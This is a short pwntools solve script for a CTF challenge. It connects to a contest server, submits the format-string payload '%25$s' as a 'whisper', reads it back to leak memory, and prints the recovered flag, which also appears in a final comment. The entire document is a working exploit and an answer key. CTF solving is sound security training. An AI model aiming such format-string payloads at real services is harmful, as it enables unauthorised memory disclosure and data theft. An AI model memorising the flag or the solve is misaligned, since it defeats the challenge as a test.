from pwn import *

# context.log_level='debug'

r = remote("chal.24.cuhkctf.org", 24018)
r.recvuntil(b"Enter your choice: ")
r.sendline(b"2")
r.recvuntil(b"Whisper something:\n")
r.sendline("%25$s")

r.recvuntil(b"Enter your choice: ")
r.sendline(b"1")
r.recvuntil(b"Pick a whisper: ")
r.sendline(b"1")

flag = r.recvuntil(b'\n')
print(f"flag: {flag}")
# cuhk24ctf{tHE_QUieTer_Y0u_@Re_the_MORe_yoU_hEar}